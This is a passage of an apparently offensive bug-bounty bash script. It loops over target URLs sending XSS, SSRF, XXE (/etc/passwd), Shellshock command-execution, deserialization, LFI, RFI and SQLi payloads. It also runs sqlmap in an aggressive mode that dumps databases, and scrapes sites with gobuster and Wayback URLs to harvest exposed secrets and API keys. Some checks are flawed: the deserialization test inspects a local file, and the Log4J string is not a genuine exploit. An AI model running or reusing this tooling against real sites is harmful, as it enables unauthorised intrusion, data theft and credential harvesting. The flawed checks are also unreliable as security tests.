	echo "Finding high known CVES (XSS, SSRF, XXE, SQLi, Insecure deserialization, RCE, FI, SDE...)" | toilet --metal -f term -F border

	R='\033[0;31m'
	G='\033[0;32m'
	Y='\033[1;33m'
	B='\033[0;34m'
	P='\033[0;35m'
	C='\033[0;36m'
	W='\033[1;37m'

	for ((i=0; i<5; i++)); do
		echo -ne "${R}10 ${G}01 ${Y}11 ${B}00 ${P}01 ${C}10 ${W}00 ${G}11 ${P}01 ${B}10 ${Y}11 ${C}00\r"
		sleep 0.2
		echo -ne "${R}01 ${G}10 ${Y}00 ${B}11 ${P}10 ${C}01 ${W}11 ${G}00 ${P}10 ${B}01 ${Y}00 ${C}11\r"
		sleep 0.2
		echo -ne "${R}11 ${G}00 ${Y}10 ${B}01 ${P}00 ${C}11 ${W}01 ${G}10 ${P}00 ${B}11 ${Y}10 ${C}01\r"
		sleep 0.2
		echo -ne "${R}00 ${G}11 ${Y}01 ${B}10 ${P}11 ${C}00 ${W}10 ${G}01 ${P}11 ${B}00 ${Y}01 ${C}10\r"
		sleep 0.2
	done
	#Start the attacks
	while read url
	do

	# Check for XSS (Cross-site scripting) vulnerability
	echo -e "\e[33mTesting \e[0m${url}\e[33m for XSS vulnerability...\e[0m"
	response=$(curl -s -H 'User-Agent: Mozilla/5.0' -d "<script>alert('XSS Vulnerability');</script>" "$url")
	if [[ $response == *"<script>alert('XSS Vulnerability');</script>"* ]]; then
		echo -e "$url is XSS \e[32mvulnerable\e[0m" >> "high_known_cves_found.txt"
	fi

	# Check for SSRF (Server-side request forgery) vulnerability
	echo -e "\e[33mTesting \e[0m${url}\e[33m for SSRF vulnerability...\e[0m"
	response=$(curl -s -H 'User-Agent: Mozilla/5.0' "$url?url=http://169.254.169.254/")
	if [[ $response == *"169.254.169.254"* ]]; then
		echo -e "$url is SSRF \e[32mvulnerable\e[0m" >> "high_known_cves_found.txt"
	fi

	# Check for XXE (XML external entity) vulnerability
	echo -e "\e[33mTesting \e[0m${url}\e[33m for XXE vulnerability...\e[0m"
	response=$(curl -s -H 'User-Agent: Mozilla/5.0' -d '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>' "$url")
	if [[ $response == *"root:x"* ]]; then
		echo -e "$url is XXE \e[32mvulnerable\e[0m" >> "high_known_cves_found.txt"
	fi

	# Check for Insecure deserialization vulnerability:
	echo -e "\e[33mTesting \e[0m${url}\e[33m for Insecure Deserialization vulnerability...\e[0m"
	response=$(curl -s -H 'User-Agent: Mozilla/5.0' -d 'O:8:"stdClass":1:{s:5:"shell";s:5:"touch /tmp/pwned";}' "$url")
	if [[ -f "/tmp/pwned" ]]; then
		echo -e "$url is insecure deserialization \e[32mvulnerable\e[0m" >> "high_known_cves_found.txt"
	fi

	# Check for Remote Code Execution via Shellshock vulnerability:
	echo -e "\e[33mTesting \e[0m${url}\e[33m for Shellshock vulnerability...\e[0m"
	response=$(curl -s -H "User-Agent: () { :; }; /bin/bash -c 'echo vulnerable'" "$url")
	if [[ $response == *"vulnerable"* ]]; then
		echo -e "$url is \e[32mvulnerable\e[0m to Shellshock RCE" >> "high_known_cves_found.txt"
		# Execute arbitrary command as proof of concept
		echo "Executing arbitrary command as proof of concept..."
		response=$(curl -s -H "User-Agent: () { :; }; /bin/bash -c 'echo SHELLSHOCK_RCE_DEMO'" "$url")
		if [[ $response == *"SHELLSHOCK_RCE_DEMO"* ]]; then
			echo "Successful RCE via Shellshock vulnerability"
		else
			echo "Failed to execute arbitrary command"
		fi
	fi

	# Check for RCE vulnerability
	echo -e "\e[33mTesting \e[0m${url}\e[33m for RCE vulnerability...\e[0m"
	response=$(curl -s -H 'User-Agent: () { :;}; echo vulnerable' "$url")
	if [[ $response == *"vulnerable"* ]]; then
		echo -e "$url is RCE \e[32mvulnerable\e[0m" >> "high_known_cves_found.txt"
	fi

	echo -e "\e[33mTesting \e[0m${url}\e[33m for CSRF vulnerability...\e[0m"
	response=$(curl -s -X POST -d 'token=test' "$url")
	if [[ $response == *"token=test"* ]]; then
		echo -e "$url is CSRF \e[32mvulnerable\e[0m" >> "high_known_cves_found.txt"
	fi


	# Check for LFI vulnerability
	echo -e "\e[33mTesting \e[0m${url}\e[33m for LFI vulnerability...\e[0m"
	response=$(curl -s "$url/../../../../../../../../../../../../etc/passwd")
	if [[ $response == *"root:"* ]]; then
		echo -e "$url is LFI \e[32mvulnerable\e[0m" >> "high_known_cves_found.txt"
	fi

	# Check for open redirect vulnerability
	echo -e "\e[33mTesting \e[0m${url}\e[33m for Open Redirect vulnerability...\e[0m"
	response=$(curl -s -L "$url?redirect=http://google.com")
	if [[ $response == *"<title>Google</title>"* ]]; then
		echo -e "$url is open redirect \e[32mvulnerable\e[0m" >> "high_known_cves_found.txt"
	fi

	# Check for Log4J vulnerability
	echo -e "\e[33mTesting \e[0m${url}\e[33m for Log4J vulnerability...\e[0m"
	response=$(curl -s "$url/%20%20%20%20%20%20%20%20@org.apache.log4j.BasicConfigurator@configure()")
	if [[ $response == *"log4j"* ]]; then
		echo -e "$url is Log4J \e[32mvulnerable\e[0m" >> "high_known_cves_found.txt"
	fi

	# Check for RFI vulnerability
	echo -e "\e[33mTesting \e[0m${url}\e[33m for RFI vulnerability...\e[0m"
	response=$(curl -s "$url?file=http://google.com")
	if [[ $response == *"<title>Google</title>"* ]]; then
		echo -e "$url is RFI \e[32mvulnerable\e[0m" >> "high_known_cves_found.txt"
	fi
	# Check for directory traversal vulnerability
	echo -e "\e[33mTesting \e[0m${url}\e[33m for path/directory traversal vulnerability...\e[0m"
	response=$(curl -s "$url/../../../../../../../../../../../../etc/passwd")
	if [[ $response == *"root:"* ]]; then
		echo -e "$url is path traversal \e[32mvulnerable\e[0m" >> "high_known_cves_found.txt"
	fi
	# Check for SQL injection vulnerability
	echo -e "\e[33mTesting \e[0m${url}\e[33m for SQL injection vulnerability...\e[0m"
	response=$(curl -s "$url/index.php?id=1'")
	if [[ $response == *"SQL syntax"* ]]; then
		echo -e "$url is SQL injection \e[32mvulnerable\e[0m" >> "high_known_cves_found.txt"
	fi
	done < urls.txt
	mv urls.txt $domain
}
################################
## CHECK SQLi
##
## Use waybackurl & httpx for checking
## with SQLmap
# 
################################
Check_SQL(){
	# Get URLs from Wayback Machine and filter them using HTTPX
	echo -e "Fetching URLs from Wayback Machine and \e[91madvanced\e[0m Regex Filtering using HTTPX..." | lolcat
	./../tools/waybackurls/main "$domain" | httpx -verbose | tee "$domain/all_urls.txt" | grep -iE '(\?|\=|\&)(id|select|update|union|from|where|insert|delete|into|information_schema)' | sort -u > "/sql_ready_urls.txt"
	cat "$domain/all_urls.txt" | grep -iE '\?' > "$domain/all_urls_withparams.txt"
	# Inform user about the number of URLs found
	num_urls=$(wc -l "$domain/all_urls.txt" | cut -d ' ' -f 1)
	echo -e "Found $num_urls URLs for $domain \e[91mbefore\e[0m applying the \e[92mMagic Regex Patterns\e[0m" | lolcat
	sleep 5  # Pause for 5 seconds

	# Inform user about the number of URLs ready for SQL injection testing
	num_sql_urls=$(wc -l "$domain/all_urls_withparams.txt" | cut -d ' ' -f 1)
	echo -e "Found $num_sql_urls URLs ready for SQL injection \e[91mafter\e[0m applying the \e[92mMagic Regex Patterns\e[0m $domain." | lolcat
	sleep 5  # Pause for 5 seconds
	# Run Arjun with 20 threads to find more parameters
	echo -e "Finding \e[91mmore\e[0m parameters using Arjun with 20 threads..." | lolcat
	arjun -i "$domain/all_urls.txt" -t 20 --disable-redirects -oJ "$domain/arjun_output.json" 

	# Extract URLs with parameters from Arjun's output
	if [ -f "$domain/arjun_output.json" ]; then
	cat "$domain/arjun_output.json" | jq -r '.[] | select(.params != null) | .url' > "$domain/arjun_urls.txt"
	else
	touch "$domain/arjun_urls.txt"
	fi

	# Merge the URLs found by Arjun with the ones ready for SQL injection
	echo "Merging Arjun and Wayback URLs with Magic..." | lolcat
	if test -f "$domain/arjun_urls.txt"; then cat "$domain/sql_ready_urls.txt" "$domain/arjun_urls.txt" "$domain/all_urls.txt" "$domain/all_urls_withparams.txt"| sort -u > "$domain/sql_ready_urls2.txt"; else cat "$domain/sql_ready_urls.txt" > "$domain/sql_ready_urls2.txt"; fi

	# Inform user about the new number of URLs ready for SQL injection testing
	num_sql_urls2=$(wc -l "$domain/sql_ready_urls2.txt" | cut -d ' ' -f 1)
	echo -e "Found $num_sql_urls2 URLs \e[91mready\e[0m for SQL injection testing for $domain after using Arjun and Mixing all results..."
	sleep 5  # Pause for 5 seconds
	# Test SQL injection on the new list of URLs using SQLMAP
	echo -e "Testing SQL injection on the new list of URLs using SQLMAP with a Tweaked \e[91mAgressive\e[0m Approach, Let's go!..." | lolcat
	sqlmap -m "$domain/sql_ready_urls2.txt" --risk=3 --smart --hpp --level=5 --random-agent --threads=10 --tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,percentage,randomcase,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes --skip-urlencode --string "saintdrugis1337" --forms --dump --dbms=mysql --batch
	echo "Make sure to examine the results \e[91mmanually\e[0m in the location where it saves all the results: /root/.local/share/sqlmap/output/" | lolcat
	sleep 3
	echo -e "\n\033[1;32mThis tool comes with amazing AI-created photos that were done during coding this. \033[0m"
	echo -e "\033[1;32mA lot of hours were spent on optimizing this massive SQL command and the flow. \033[0m"
	echo -e "\033[1;32mFeel free to check it out on our GitHub repo! \033[0m"

	echo -e "\n\033[1;34m--------------------------------------------\033[0m"

	echo -e "\033[1;36mYou can view the wallpapers that inspired us during the creation of this tool on our GitHub repo: \033[0m"
	echo -e "\033[1;33mIn Your Directory: SQLMutant/WallPapers Imag1nations creating this tool \033[0m"

	echo -e "\033[1;34m--------------------------------------------\033[0m\n"

	echo -e "\033[1;32mThank you for using SQLMutant by SaintDruG! \033[0m"
	# Matrix effect
	echo "Entering the Matrix for 5 seconds:" | toilet --metal -f term -F border


}

################################
## CHECK SECRETS QUICK
##
## Use subdomains from previous enum to curl
## and check secrets (api, etc...)
# 
################################
Check_secrets_quick() {
	wget https://raw.githubusercontent.com/koff75/bug-bounty/main/secret_keys.json
	mv ./secret_keys.json ./secret/secret_keys.json
	secrethub="./secret/secret_keys.json"
	# Set the starting count to 0
	count=0
	while read url; do
		echo "Fetching content from $url..." | lolcat
		curl -vsS -n "$url" > "secret/discovered_urls_for_$(echo $url | awk -F/ '{print $3}').txt" 2>&1
	done < "subdomains/url_httpx.txt"
	# Search for secrets in the output of curl and save the result in secrets.csv

	if [ ! -f "secret/discovered_urls_for_$targetname.txt" ]; then
		echo "No discovered_urls_for_$targetname file found."
		exit 1
	fi
	while read discovered_url; do
		discovered_url_file="secret/discovered_urls_for_$(echo $discovered_url | awk -F/ '{print $3}').txt"
		if [ ! -f "$discovered_url_file" ]; then
			echo "File $discovered_url_file does not exist."
			continue
		fi
		secret_found=$(grep -E $(cat $secrethub | jq -r '.patterns | join("|")') "secret/discovered_urls_for_$(echo $discovered_url | awk -F/ '{print $3}').txt" | awk '!seen[$0]++ { print $0 }')
		count=$(echo "$secret_found" | wc -l)
		if [ -n "$secret_found" ]; then
			echo "URL Affected: $discovered_url, Secret Found: $secret_found" >> "secret/secrets.csv"
			echo "Total secrets found: $count" >> "secret/secrets.csv"
		fi
		rm -v "secret/discovered_urls_for_$(echo $discovered_url | awk -F/ '{print $3}').txt"
	done < "secret/discovered_urls.txt"

	rm secret/discovered_urls.txt
	# Print Summary
	SendDiscord "Total secrets found for $targetname: $count"
}
################################
## CHECK SECRETS FULL
##
## Use gobuster & waybackurl & curl for
## checking secrets (api, etc...)
# 
################################
Check_secrets_full() {
	# ------------------------Scanning-------------------------
	# WORDLIST TO BE MODIFIED :
	wordlist="/usr/share/seclists/Discovery/Web-Content/common-and-french.txt"

	wget https://raw.githubusercontent.com/koff75/bug-bounty/main/secret_keys.json
	mv ./secret_keys.json ./secret/secret_keys.json
	secrethub="./secret/secret_keys.json"

	gobuster dir -u https://www.$targetname -w $wordlist -x .js,.php,.yml,.env,.txt,.xml,.html,.config -t 30 -e -o secret/gobuster.txt --wildcard

	# Extract the discovered URLs for further testing
	echo "Extracting and filtering only 2xx & 3xx status codes..." | lolcat
	grep -E "Status: (2[0-9]{2}|3[3-9]{2})" secret/gobuster.txt | grep -oE "(http|https)://[a-zA-Z0-9./?=_-]*" | sort -u > secret/discovered_urls.txt



	echo "Starting GoBuster & Waybackurls..." | lolcat
	./../tools/waybackurls/main "$targetname" | grep -E "\.js$|\.php$|\.yml$|\.env$|\.txt$|\.xml$|\.config$" | sed -E "s#(https?://)?(www\.)?$targetname.*#\1\2$targetname#g" | sort -u | httpx -verbose -o "secret/waybackurls.txt" | lolcat

	# Combine the discovered URLs from gobuster and waybackurls, removing duplicates
	echo "Combining discovered URLs from gobuster and waybackurls" | lolcat

	cat secret/waybackurls.txt secret/discovered_urls.txt | sort -u > secret/combined_urls.txt
	mv secret/combined_urls.txt secret/discovered_urls.txt
	rm secret/waybackurls.txt

	# ------------------------Processing-------------------------
	# Set the starting count to 0
	count=0
	while read url; do
		echo "Fetching content from $url..." | lolcat
		curl -vsS -n "$url" > "secret/discovered_urls_for_$(echo $url | awk -F/ '{print $3}').txt" 2>&1
	done < "secret/discovered_urls.txt"
	# Search for secrets in the output of curl and save the result in secrets.csv

	if [ ! -f "secret/discovered_urls_for_$targetname.txt" ]; then
		echo "No discovered_urls_for_$targetname file found."
		exit 1
	fi
	while read discovered_url; do
		discovered_url_file="secret/discovered_urls_for_$(echo $discovered_url | awk -F/ '{print $3}').txt"
		if [ ! -f "$discovered_url_file" ]; then
			echo "File $discovered_url_file does not exist."
			continue
		fi
		secret_found=$(grep -E $(cat $secrethub | jq -r '.patterns | join("|")') "secret/discovered_urls_for_$(echo $discovered_url | awk -F/ '{print $3}').txt" | awk '!seen[$0]++ { print $0 }')
		count=$(echo "$secret_found" | wc -l)
		if [ -n "$secret_found" ]; then
			echo "URL Affected: $discovered_url, Secret Found: $secret_found" >> "secret/secrets.csv"
			echo "Total secrets found: $count" >> "secret/secrets.csv"
		fi
		rm -v "secret/discovered_urls_for_$(echo $discovered_url | awk -F/ '{print $3}').txt"
	done < "secret/discovered_urls.txt"

	rm secret/discovered_urls.txt
	# Print Summary
	echo "Total secrets found for $targetname: $count" | lolcat

}
# ----------------------------------------- #
#              END FUNCTIONS
# ----------------------------------------- #

# ----------------------------------------- #
#              START SCRIPT
# ----------------------------------------- #

#Enumeration
# Nuclei_start
# ----------------------------------------- #
#              END SCRIPT
# ----------------------------------------- #

